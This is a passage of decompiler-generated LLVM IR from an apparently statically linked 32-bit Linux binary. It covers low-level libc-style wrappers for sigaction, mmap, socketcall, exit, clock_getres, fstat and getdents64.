  %v12_8052230 = icmp eq i32 %v0_8052230, %v0_805222b
  %v1_8052232 = icmp eq i1 %v12_8052230, false
  br i1 %v1_8052232, label %dec_label_pc_8052253, label %dec_label_pc_805227d

dec_label_pc_805223d:                             ; preds = %dec_label_pc_80521ee
  br label %dec_label_pc_8052253

dec_label_pc_8052253:                             ; preds = %dec_label_pc_805223d, %dec_label_pc_8052224, %dec_label_pc_8052214
  store i32 131072, i32* @edx, align 4
  store i32 0, i32* @eax, align 4
  %v0_805225a = call i32 @function_80520eb()
  store i32 131074, i32* @edx, align 4
  store i32 1, i32* @eax, align 4
  %v0_8052269 = call i32 @function_80520eb()
  store i32 131074, i32* @edx, align 4
  store i32 2, i32* @eax, align 4
  %v0_8052278 = call i32 @function_80520eb()
  br label %dec_label_pc_805227d

dec_label_pc_805227d:                             ; preds = %dec_label_pc_8052224, %dec_label_pc_8052253
  store i32 ptrtoint (i32* @global_var_80542c4.58 to i32), i32* %esi.global-to-local, align 4
  %v0_8052282 = load i32, i32* @edi, align 4
  %v1_8052282 = inttoptr i32 %v0_8052282 to i32*
  %v2_8052282 = load i32, i32* %v1_8052282, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_80542c4.58 to i32), i32 -134562500), i32* %esi.global-to-local, align 4
  store i32 %v2_8052282, i32* inttoptr (i32 134562632 to i32*), align 8
  store i32 sdiv (i32 add (i32 ptrtoint (i32* @global_var_80542c4.58 to i32), i32 -134562500), i32 4), i32* %esi.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 %arg5, i32* @global_var_8054408.60, align 8
  br i1 icmp ult (i32 add (i32 ptrtoint (i32* @global_var_80542c4.58 to i32), i32 -134562497), i32 7), label %dec_label_pc_80522ae, label %dec_label_pc_80522a2

dec_label_pc_80522a2:                             ; preds = %dec_label_pc_805227d, %dec_label_pc_80522a2
  %v4_80522a2 = phi i32 [ %v1_80522a9, %dec_label_pc_80522a2 ], [ 0, %dec_label_pc_805227d ]
  store i32 ptrtoint (i32* @global_var_80522a9.69 to i32), i32* %stack_var_-164, align 4
  %v5_80522a2 = mul i32 %v4_80522a2, 4
  %v6_80522a2 = add i32 %v5_80522a2, ptrtoint (i32* @global_var_80542c4.58 to i32)
  %v7_80522a2 = inttoptr i32 %v6_80522a2 to i32*
  %v8_80522a2 = load i32, i32* %v7_80522a2, align 4
  call void @__pseudo_call(i32 %v8_80522a2)
  %v0_80522a9 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80522a9 = add i32 %v0_80522a9, 1
  store i32 %v1_80522a9, i32* %ebx.global-to-local, align 4
  %v1_80522aa = load i32, i32* %esi.global-to-local, align 4
  %v7_80522aa = icmp ult i32 %v1_80522a9, %v1_80522aa
  br i1 %v7_80522aa, label %dec_label_pc_80522a2, label %dec_label_pc_80522ae

dec_label_pc_80522ae:                             ; preds = %dec_label_pc_80522a2, %dec_label_pc_805227d
  call void @__pseudo_call(i32 %arg4)
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80542c4.58 to i32), i32 -134562500), i32 2), i32* %esi.global-to-local, align 4
  br i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80542c4.58 to i32), i32 -134562500), i32 2), i32 0), label %dec_label_pc_80522c6, label %dec_label_pc_80522d2

dec_label_pc_80522c6:                             ; preds = %dec_label_pc_80522ae, %dec_label_pc_80522c6
  %v4_80522c6 = phi i32 [ %v1_80522cd, %dec_label_pc_80522c6 ], [ 0, %dec_label_pc_80522ae ]
  store i32 ptrtoint (i32* @global_var_80522cd.70 to i32), i32* %stack_var_-164, align 4
  %v5_80522c6 = mul i32 %v4_80522c6, 4
  %v6_80522c6 = add i32 %v5_80522c6, ptrtoint (i32* @global_var_80542c4.58 to i32)
  %v7_80522c6 = inttoptr i32 %v6_80522c6 to i32*
  %v8_80522c6 = load i32, i32* %v7_80522c6, align 4
  call void @__pseudo_call(i32 %v8_80522c6)
  %v0_80522cd = load i32, i32* %ebx.global-to-local, align 4
  %v1_80522cd = add i32 %v0_80522cd, 1
  store i32 %v1_80522cd, i32* %ebx.global-to-local, align 4
  %v1_80522ce = load i32, i32* %esi.global-to-local, align 4
  %v7_80522ce = icmp ult i32 %v1_80522cd, %v1_80522ce
  br i1 %v7_80522ce, label %dec_label_pc_80522c6, label %dec_label_pc_80522d2

dec_label_pc_80522d2:                             ; preds = %dec_label_pc_80522c6, %dec_label_pc_80522ae
  %v0_80522db = load i32, i32* %stack_var_-164, align 4
  %v1_80522db = call i32 @function_805078b(i32 %v0_80522db)
  %v1_80522e0 = inttoptr i32 %v1_80522db to i32*
  store i32 0, i32* %v1_80522e0, align 4
  store i32 0, i32* @eax, align 4
  %v0_80522fb = load i32, i32* @global_var_8054400.66, align 1024
  store i32 %v0_80522fb, i32* %stack_var_-164, align 4
  %v0_8052301 = load i32, i32* @edi, align 4
  store i32 %v0_8052301, i32* %stack_var_-168, align 4
  call void @__pseudo_call(i32 %arg1)
  %v0_8052310 = load i32, i32* @eax, align 4
  %v1_8052313 = call i32 @function_8051d73(i32 %v0_8052310)
  %v0_805231d = load i32, i32* @ebx, align 4
  %v1_805231d = inttoptr i32 %v0_805231d to %sigcontext*
  %v2_805231d = call i32 @sigreturn(%sigcontext* %v1_805231d)
  %v0_8052325 = load i32, i32* @ebx, align 4
  %v1_8052325 = inttoptr i32 %v0_8052325 to %sigcontext*
  %v2_8052325 = call i32 @sigreturn(%sigcontext* %v1_8052325)
  ret i32 %v2_8052325

; uselistorder directives
  uselistorder i32 %v1_80522cd, { 1, 2, 0 }
  uselistorder i32 %v1_80522a9, { 1, 2, 0 }
  uselistorder i32 %v2_80521e9, { 1, 0 }
  uselistorder i32 %v1_80521e6, { 2, 1, 0 }
  uselistorder i32 %v1_80521c5, { 0, 2, 1, 3 }
  uselistorder i32 %v0_80521c2, { 1, 0 }
  uselistorder i32* %stack_var_-164, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %stack_var_-168, { 0, 1, 3, 2 }
  uselistorder i32 (i32)* @function_8051d73, { 0, 2, 1 }
  uselistorder i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80542c4.58 to i32), i32 -134562500), i32 2), { 1, 3, 2, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_80542c4.58 to i32), i32 -134562500), { 0, 2, 1 }
  uselistorder i32 ()* @function_80520eb, { 2, 1, 0 }
  uselistorder i32 131072, { 2, 1, 0 }
  uselistorder i32 -65536, { 9, 0, 1, 7, 8, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_80522c6, { 1, 0 }
  uselistorder label %dec_label_pc_80522a2, { 1, 0 }
  uselistorder label %dec_label_pc_805227d, { 1, 0 }
  uselistorder label %dec_label_pc_80521e6, { 1, 0 }
  uselistorder label %dec_label_pc_80521ce, { 1, 0 }
}

define i32 @function_8052327(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8052327:
  %ebx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg2 to i32
  %stack_var_-276 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-288 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %v0_8052327 = load i32, i32* @esi, align 4
  %v0_8052328 = load i32, i32* @ebx, align 4
  store i32 %tmp11, i32* @ebx, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_805233d = icmp eq i32* %arg2, null
  br i1 %v1_805233d, label %dec_label_pc_8052327.dec_label_pc_8052390_crit_edge, label %dec_label_pc_8052341

dec_label_pc_8052327.dec_label_pc_8052390_crit_edge: ; preds = %dec_label_pc_8052327
  br label %dec_label_pc_8052390

dec_label_pc_8052341:                             ; preds = %dec_label_pc_8052327
  %v2_8052341 = load i32, i32* %arg2, align 4
  store i32 %v2_8052341, i32* %stack_var_-148, align 4
  %v1_805234a = add i32 %tmp11, 4
  %v3_805235c = bitcast i32* %stack_var_-136 to i16*
  %v4_805235c = call i32 @function_80529aa(i16* %v3_805235c, i32 %v1_805234a, i32 128)
  br label %dec_label_pc_8052390

dec_label_pc_8052390:                             ; preds = %dec_label_pc_8052327.dec_label_pc_8052390_crit_edge, %dec_label_pc_8052341
  %v1_8052392 = icmp eq i32 %arg3, 0
  %v2_8052396 = ptrtoint i32* %stack_var_-288 to i32
  %.v2_8052396 = select i1 %v1_8052392, i32 0, i32 %v2_8052396
  %phitmp = bitcast i32* %stack_var_-148 to %sigaction*
  %v0_80523aa = select i1 %v1_805233d, %sigaction* null, %sigaction* %phitmp
  %v5_80523b2 = call i32 @function_805244d(i32 %arg1, %sigaction* %v0_80523aa, i32 %.v2_8052396, i32 8)
  store i32 %v5_80523b2, i32* %ebx.global-to-local, align 4
  %v2_80523c0 = icmp slt i32 %v5_80523b2, 0
  %or.cond = or i1 %v1_8052392, %v2_80523c0
  br i1 %or.cond, label %dec_label_pc_80523f5, label %dec_label_pc_80523c4

dec_label_pc_80523c4:                             ; preds = %dec_label_pc_8052390
  %v3_80523c4 = load i32, i32* %stack_var_-288, align 4
  %v2_80523c8 = inttoptr i32 %arg3 to i32*
  store i32 %v3_80523c4, i32* %v2_80523c8, align 4
  %v2_80523d0 = ptrtoint i32* %stack_var_-276 to i32
  %v1_80523d5 = add i32 %arg3, 4
  %v3_80523d9 = inttoptr i32 %v1_80523d5 to i16*
  %v4_80523d9 = call i32 @function_80529aa(i16* %v3_80523d9, i32 %v2_80523d0, i32 128)
  %v2_80523e2 = add i32 %arg3, 132
  %v3_80523e2 = inttoptr i32 %v2_80523e2 to i32*
  %v2_80523ef = add i32 %arg3, 136
  %v3_80523ef = inttoptr i32 %v2_80523ef to i32*
  %v0_80523f5.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80523f5

dec_label_pc_80523f5:                             ; preds = %dec_label_pc_8052390, %dec_label_pc_80523c4
  %v0_80523f5 = phi i32 [ %v5_80523b2, %dec_label_pc_8052390 ], [ %v0_80523f5.pre, %dec_label_pc_80523c4 ]
  store i32 %v0_8052328, i32* @ebx, align 4
  store i32 %v0_8052327, i32* @esi, align 4
  ret i32 %v0_80523f5

; uselistorder directives
  uselistorder i32 128, { 0, 1, 3, 2 }
  uselistorder i32 %arg3, { 2, 1, 4, 3, 0, 5 }
  uselistorder label %dec_label_pc_80523f5, { 1, 0 }
  uselistorder label %dec_label_pc_8052390, { 1, 0 }
}

define i32 @function_8052400(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_8052400:
  %stack_var_4 = alloca i32, align 4
  %v0_8052400 = load i32, i32* @ebx, align 4
  store i32 %v0_8052400, i32* @edx, align 4
  %v2_805240b = load i32, i32* @ecx, align 4
  %v4_805240b = load i32, i32* @esi, align 4
  %v5_805240b = load i32, i32* @edi, align 4
  %v6_805240b = load i32, i32* @ebp, align 4
  %v7_805240b = call i32* @mmap(i32* nonnull %stack_var_4, i32 %v2_805240b, i32 %v0_8052400, i32 %v4_805240b, i32 %v5_805240b, i32 %v6_805240b)
  %v8_805240b = ptrtoint i32* %v7_805240b to i32
  store i32 %v0_8052400, i32* @ebx, align 4
  %v3_8052414 = icmp ugt i32* %v7_805240b, inttoptr (i32 -4096 to i32*)
  call void @__pseudo_cond_branch(i1 %v3_8052414, i32 134556357)
  ret i32 %v8_805240b

; uselistorder directives
  uselistorder i32* @ebp, { 2, 49, 50, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 24, 20, 21, 22, 23, 1, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 46, 47, 48, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 0 }
  uselistorder i32* @ecx, { 3, 34, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 0, 24, 25, 26, 1, 27, 36, 35, 29, 30, 2, 31, 32, 28, 33 }
}

define i32 @function_805241b(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_805241b:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805241b = load i32, i32* @ebx, align 4
  store i32 %v0_805241b, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_805242e = call i32 @int80_syscall(i32 102)
  store i32 %v1_805242e, i32* %ebx.global-to-local, align 4
  %tmp9 = icmp ult i32 %v1_805242e, -4095
  br i1 %tmp9, label %dec_label_pc_8052447, label %dec_label_pc_805243b

dec_label_pc_805243b:                             ; preds = %dec_label_pc_805241b
  %v1_805243b = call i32 @function_805078b(i32 %v0_805241b)
  %v0_8052440 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052440 = sub i32 0, %v0_8052440
  %v2_8052442 = inttoptr i32 %v1_805243b to i32*
  store i32 %v1_8052440, i32* %v2_8052442, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_805244b.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8052447

dec_label_pc_8052447:                             ; preds = %dec_label_pc_805241b, %dec_label_pc_805243b
  %v2_805244b = phi i32 [ %v0_805241b, %dec_label_pc_805241b ], [ %v2_805244b.pre, %dec_label_pc_805243b ]
  %v0_8052447 = phi i32 [ %v1_805242e, %dec_label_pc_805241b ], [ -1, %dec_label_pc_805243b ]
  %v2_8052449 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8052449, i32* @edx, align 4
  store i32 %v2_805244b, i32* @ebx, align 4
  ret i32 %v0_8052447

; uselistorder directives
  uselistorder i32 %v1_805242e, { 1, 0, 2 }
  uselistorder i32 102, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8052447, { 1, 0 }
}

define i32 @function_805244d(i32 %arg1, %sigaction* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_805244d:
  %esi.global-to-local = alloca i32, align 4
  %tmp5 = inttoptr i32 %arg3 to %sigaction*
  %stack_var_-8 = alloca i32, align 4
  %v0_805244e = load i32, i32* @esi, align 4
  store i32 %v0_805244e, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_8052462 = load i32, i32* @ebx, align 4
  %v7_805246a = call i32 @sigaction(i32 %arg1, %sigaction* %arg2, %sigaction* %tmp5)
  store i32 %v7_805246a, i32* %esi.global-to-local, align 4
  %tmp14 = icmp ult i32 %v7_805246a, -4095
  br i1 %tmp14, label %dec_label_pc_8052482, label %dec_label_pc_8052476

dec_label_pc_8052476:                             ; preds = %dec_label_pc_805244d
  %v1_8052476 = call i32 @function_805078b(i32 %v0_8052462)
  %v0_805247b = load i32, i32* %esi.global-to-local, align 4
  %v1_805247b = sub i32 0, %v0_805247b
  %v2_805247d = inttoptr i32 %v1_8052476 to i32*
  store i32 %v1_805247b, i32* %v2_805247d, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  %v2_8052485.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8052482

dec_label_pc_8052482:                             ; preds = %dec_label_pc_805244d, %dec_label_pc_8052476
  %v2_8052485 = phi i32 [ %v0_805244e, %dec_label_pc_805244d ], [ %v2_8052485.pre, %dec_label_pc_8052476 ]
  %v0_8052482 = phi i32 [ %v7_805246a, %dec_label_pc_805244d ], [ -1, %dec_label_pc_8052476 ]
  store i32 %v2_8052485, i32* @esi, align 4
  ret i32 %v0_8052482

; uselistorder directives
  uselistorder i32 %v7_805246a, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8052482, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @function_8052488(i32 %arg1) local_unnamed_addr #0 {
dec_label_pc_8052488:
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg1, i32* @ebx, align 4
  call void @exit(i32 %arg1)
  unreachable
}

define i32 @function_80524b0(i32 %arg1, %timespec* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80524b0:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80524b0 = load i32, i32* @ebx, align 4
  store i32 %v0_80524b0, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v4_80524c3 = call i32 @clock_getres(i32 %arg1, %timespec* %arg2)
  store i32 %v4_80524c3, i32* %ebx.global-to-local, align 4
  %tmp10 = icmp ult i32 %v4_80524c3, -4095
  br i1 %tmp10, label %dec_label_pc_80524dc, label %dec_label_pc_80524d0

dec_label_pc_80524d0:                             ; preds = %dec_label_pc_80524b0
  %v1_80524d0 = call i32 @function_805078b(i32 %v0_80524b0)
  %v0_80524d5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80524d5 = sub i32 0, %v0_80524d5
  %v2_80524d7 = inttoptr i32 %v1_80524d0 to i32*
  store i32 %v1_80524d5, i32* %v2_80524d7, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_80524e0.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80524dc

dec_label_pc_80524dc:                             ; preds = %dec_label_pc_80524b0, %dec_label_pc_80524d0
  %v2_80524e0 = phi i32 [ %v0_80524b0, %dec_label_pc_80524b0 ], [ %v2_80524e0.pre, %dec_label_pc_80524d0 ]
  %v0_80524dc = phi i32 [ %v4_80524c3, %dec_label_pc_80524b0 ], [ -1, %dec_label_pc_80524d0 ]
  %v2_80524de = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80524de, i32* @edx, align 4
  store i32 %v2_80524e0, i32* %ebx.global-to-local, align 4
  ret i32 %v0_80524dc

; uselistorder directives
  uselistorder i32 %v4_80524c3, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80524dc, { 1, 0 }
}

define i32 @function_80524e2(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80524e2:
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80524e2 = load i32, i32* @ebx, align 4
  store i32 %v0_80524e2, i32* %stack_var_-4, align 4
  %tmp11 = bitcast i32* %stack_var_-68 to %stat*
  %v4_80524f5 = call i32 @fstat(i32 %arg1, %stat* %tmp11)
  store i32 %v4_80524f5, i32* @ebx, align 4
  %tmp13 = icmp ult i32 %v4_80524f5, -4095
  br i1 %tmp13, label %dec_label_pc_8052510, label %dec_label_pc_8052502

dec_label_pc_8052502:                             ; preds = %dec_label_pc_80524e2
  %v1_8052502 = call i32 @function_805078b(i32 %v0_80524e2)
  %v0_8052507 = load i32, i32* @ebx, align 4
  %v1_8052507 = sub i32 0, %v0_8052507
  %v2_8052509 = inttoptr i32 %v1_8052502 to i32*
  store i32 %v1_8052507, i32* %v2_8052509, align 4
  %v2_8052528.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8052523

dec_label_pc_8052510:                             ; preds = %dec_label_pc_80524e2
  %v1_8052510 = icmp eq i32 %v4_80524f5, 0
  %v1_8052512 = icmp eq i1 %v1_8052510, false
  br i1 %v1_8052512, label %dec_label_pc_8052523, label %dec_label_pc_8052514

dec_label_pc_8052514:                             ; preds = %dec_label_pc_8052510
  %v4_805251b = bitcast i32* %stack_var_-68 to i16*
  %v5_805251b = call i32 @function_805292d(i16* %v4_805251b, i32 %arg2, i32 %v4_80524f5, i32 %v4_80524f5)
  %v0_8052523.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8052523

dec_label_pc_8052523:                             ; preds = %dec_label_pc_8052510, %dec_label_pc_8052502, %dec_label_pc_8052514
  %v2_8052528 = phi i32 [ %v0_80524e2, %dec_label_pc_8052510 ], [ %v2_8052528.pre, %dec_label_pc_8052502 ], [ %v0_80524e2, %dec_label_pc_8052514 ]
  %v0_8052523 = phi i32 [ %v4_80524f5, %dec_label_pc_8052510 ], [ -1, %dec_label_pc_8052502 ], [ %v0_8052523.pre, %dec_label_pc_8052514 ]
  store i32 %v2_8052528, i32* @ebx, align 4
  ret i32 %v0_8052523

; uselistorder directives
  uselistorder i32 %v4_80524f5, { 1, 2, 3, 4, 0, 5 }
  uselistorder label %dec_label_pc_8052523, { 2, 0, 1 }
}

define i32 @function_805252a(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_805252a:
  %eax.global-to-local = alloca i32, align 4
  %v0_805252a = load i32, i32* @edi, align 4
  %v0_805252b = load i32, i32* @esi, align 4
  %v0_805252c = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ebx, align 4
  %v0_8052531 = load i32, i32* @edx, align 4
  %v7_805253b = inttoptr i32 %arg2 to i32*
  %v8_805253b = call i32 @function_8052599(i32 %arg1, i32* %v7_805253b, i32 %arg3, i32 %v0_8052531, i32 %v0_805252c, i32 %v0_805252b, i32 %v0_805252a)
  store i32 %v8_805253b, i32* %eax.global-to-local, align 4
  store i32 %v8_805253b, i32* @esi, align 4
  %tmp24 = icmp slt i32 %v8_805253b, 1
  br i1 %tmp24, label %dec_label_pc_8052593, label %dec_label_pc_8052549

dec_label_pc_8052549:                             ; preds = %dec_label_pc_805252a
  %v0_8052549 = load i32, i32* @ebx, align 4
  %v2_8052549 = add i32 %v0_8052549, %v8_805253b
  store i32 %v2_8052549, i32* @edi, align 4
  %v7_805258f4 = icmp ult i32 %v0_8052549, %v2_8052549
  br i1 %v7_805258f4, label %dec_label_pc_805254e, label %dec_label_pc_8052593

dec_label_pc_805254e:                             ; preds = %dec_label_pc_8052549, %dec_label_pc_805254e
  %v0_805254e = phi i32 [ %v2_805258d, %dec_label_pc_805254e ], [ %v0_8052549, %dec_label_pc_8052549 ]
  %v1_805254e = add i32 %v0_805254e, 8
  %v2_805254e = inttoptr i32 %v1_805254e to i32*
  %v3_805254e = load i32, i32* %v2_805254e, align 4
  store i32 %v3_805254e, i32* %eax.global-to-local, align 4
  %v2_8052551 = add i32 %v0_805254e, 4
  %v3_8052551 = inttoptr i32 %v2_8052551 to i32*
  store i32 %v3_805254e, i32* %v3_8052551, align 4
  %v0_8052554 = load i32, i32* @ebx, align 4
  %v1_8052554 = add i32 %v0_8052554, 16
  %v2_8052554 = inttoptr i32 %v1_8052554 to i32*
  %v3_8052554 = load i32, i32* %v2_8052554, align 4
  store i32 %v3_8052554, i32* %eax.global-to-local, align 4
  %v1_8052557 = trunc i32 %v3_8052554 to i16
  %v3_8052557 = add i32 %v0_8052554, 8
  %v4_8052557 = inttoptr i32 %v3_8052557 to i16*
  store i16 %v1_8052557, i16* %v4_8052557, align 2
  %v0_805255b = load i32, i32* @ebx, align 4
  %v1_805255b = add i32 %v0_805255b, 18
  %v2_805255b = inttoptr i32 %v1_805255b to i8*
  %v3_805255b = load i8, i8* %v2_805255b, align 1
  %v4_805255b = zext i8 %v3_805255b to i32
  %v5_805255b = load i32, i32* %eax.global-to-local, align 4
  %v6_805255b = and i32 %v5_805255b, -256
  %v7_805255b = or i32 %v6_805255b, %v4_805255b
  store i32 %v7_805255b, i32* %eax.global-to-local, align 4
  %v3_805255e = add i32 %v0_805255b, 10
  %v4_805255e = inttoptr i32 %v3_805255e to i8*
  store i8 %v3_805255b, i8* %v4_805255e, align 1
  %v0_8052562 = load i32, i32* @ebx, align 4
  %v1_8052562 = add i32 %v0_8052562, 8
  %v2_8052562 = inttoptr i32 %v1_8052562 to i16*
  %v3_8052562 = load i16, i16* %v2_8052562, align 2
  %v4_8052562 = zext i16 %v3_8052562 to i32
  %v1_8052566 = add nsw i32 %v4_8052562, -19
  %v1_805256a = add i32 %v0_8052562, 19
  %v1_805256e = add i32 %v0_8052562, 11
  store i32 %v1_805256e, i32* %eax.global-to-local, align 4
  %v3_8052572 = inttoptr i32 %v1_805256e to i8*
  %v4_8052572 = call i32 @function_80507b5(i8* %v3_8052572, i32 %v1_805256a, i32 %v1_8052566)
  store i32 %v4_8052572, i32* %eax.global-to-local, align 4
  %v0_805257a = load i32, i32* @ebx, align 4
  %v1_805257a = add i32 %v0_805257a, 8
  %v2_805257a = inttoptr i32 %v1_805257a to i16*
  %v3_805257a = load i16, i16* %v2_805257a, align 2
  %v4_805257a = zext i16 %v3_805257a to i32
  store i32 %v4_805257a, i32* %eax.global-to-local, align 4
  %v3_8052581 = inttoptr i32 %v0_805257a to i8*
  %v4_8052581 = call i32 @function_80507b5(i8* %v3_8052581, i32 %v0_805257a, i32 %v4_805257a)
  store i32 %v4_8052581, i32* %eax.global-to-local, align 4
  %v0_8052586 = load i32, i32* @ebx, align 4
  %v1_8052586 = add i32 %v0_8052586, 8
  %v2_8052586 = inttoptr i32 %v1_8052586 to i16*
  %v3_8052586 = load i16, i16* %v2_8052586, align 2
  %v4_8052586 = zext i16 %v3_8052586 to i32
  store i32 %v4_8052586, i32* %eax.global-to-local, align 4
  %v2_805258d = add i32 %v4_8052586, %v0_8052586
  store i32 %v2_805258d, i32* @ebx, align 4
  %v1_805258f = load i32, i32* @edi, align 4
  %v7_805258f = icmp ult i32 %v2_805258d, %v1_805258f
  br i1 %v7_805258f, label %dec_label_pc_805254e, label %dec_label_pc_805258f.dec_label_pc_8052593.loopexit_crit_edge

dec_label_pc_805258f.dec_label_pc_8052593.loopexit_crit_edge: ; preds = %dec_label_pc_805254e
  %v0_8052593.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8052593

dec_label_pc_8052593:                             ; preds = %dec_label_pc_8052549, %dec_label_pc_805258f.dec_label_pc_8052593.loopexit_crit_edge, %dec_label_pc_805252a
  %v0_8052593 = phi i32 [ %v8_805253b, %dec_label_pc_805252a ], [ %v0_8052593.pre.pre, %dec_label_pc_805258f.dec_label_pc_8052593.loopexit_crit_edge ], [ %v8_805253b, %dec_label_pc_8052549 ]
  store i32 %v0_8052593, i32* %eax.global-to-local, align 4
  store i32 %v0_805252b, i32* @esi, align 4
  store i32 %v0_805252a, i32* @edi, align 4
  ret i32 %v0_8052593

; uselistorder directives
  uselistorder i32 %v0_8052593, { 1, 0 }
  uselistorder i32 %v2_805258d, { 1, 2, 0 }
  uselistorder i32 %v0_805257a, { 1, 0, 2 }
  uselistorder i32 %v0_8052562, { 1, 0, 2 }
  uselistorder i32 %v0_805254e, { 1, 0 }
  uselistorder i32 %v0_8052549, { 0, 2, 1 }
  uselistorder i32 %v8_805253b, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 (i8*, i32, i32)* @function_80507b5, { 0, 1, 3, 2 }
  uselistorder i32 11, { 4, 3, 5, 6, 2, 0, 1 }
  uselistorder label %dec_label_pc_8052593, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805254e, { 1, 0 }
}

define i32 @function_8052599(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_8052599:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %tmp14 = ptrtoint i32* %arg2 to i32
  %stack_var_-60 = alloca i32, align 4
  %v0_805259c = load i32, i32* @edi, align 4
  %v0_805259e = load i32, i32* @ebx, align 4
  %v15_805259f = ptrtoint i32* %stack_var_-60 to i32
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v1_80525a8 = add i32 %arg3, 30
  %v1_80525ae = and i32 %v1_80525a8, -16
  %v2_80525b1 = sub i32 %v15_805259f, %v1_80525ae
  %v1_80525b3 = add i32 %v2_80525b1, 15
  %v1_80525b7 = and i32 %v1_80525b3, -16
  %v1_80525bd = inttoptr i32 %v1_80525b7 to %linux_dirent64*
  store i32 %v1_80525b7, i32* %ecx.global-to-local, align 4
  %v2_80525bf = add i32 %v2_80525b1, -4
  %v3_80525bf = inttoptr i32 %v2_80525bf to i32*
  store i32 %v0_805259e, i32* %v3_80525bf, align 4
  %v0_80525c0 = load i32, i32* %edi.global-to-local, align 4
  store i32 220, i32* %eax.global-to-local, align 4
  %v5_80525c7 = call i32 @getdents64(i32 %v0_80525c0, %linux_dirent64* %v1_80525bd, i32 %arg3)
  store i32 %v5_80525c7, i32* %eax.global-to-local, align 4
  %v0_80525c9 = load i32, i32* @esp, align 4
  %v3_80525c9 = add i32 %v0_80525c9, 4
  %tmp39 = icmp ult i32 %v5_80525c7, -4095
  br i1 %tmp39, label %dec_label_pc_80525e9, label %dec_label_pc_80525d4

dec_label_pc_80525d4:                             ; preds = %dec_label_pc_8052599
  %v1_80525d4 = call i32 @function_805078b(i32 %v5_80525c7)
  store i32 %v1_80525d4, i32* %eax.global-to-local, align 4
  %v4_80525d9 = sub i32 0, %v5_80525c7
  %v2_80525df = inttoptr i32 %v1_80525d4 to i32*
  store i32 %v4_80525d9, i32* %v2_80525df, align 4
  br label %dec_label_pc_80526a5

dec_label_pc_80525e9:                             ; preds = %dec_label_pc_8052599
  store i32 %tmp14, i32* @esi, align 4
  store i32 %v1_80525b7, i32* @ebx, align 4
  %v5_8052695 = add i32 %v5_80525c7, %v1_80525b7
  store i32 %v5_8052695, i32* %eax.global-to-local, align 4
  %v7_805269829 = icmp ult i32 %v1_80525b7, %v5_8052695
  br i1 %v7_805269829, label %dec_label_pc_8052602.lr.ph, label %dec_label_pc_80526a0

dec_label_pc_8052602.lr.ph:                       ; preds = %dec_label_pc_80525e9
  %v5_805260f = add i32 %tmp14, %arg3
  br label %dec_label_pc_8052602

dec_label_pc_8052602:                             ; preds = %dec_label_pc_8052602.lr.ph, %dec_label_pc_8052644
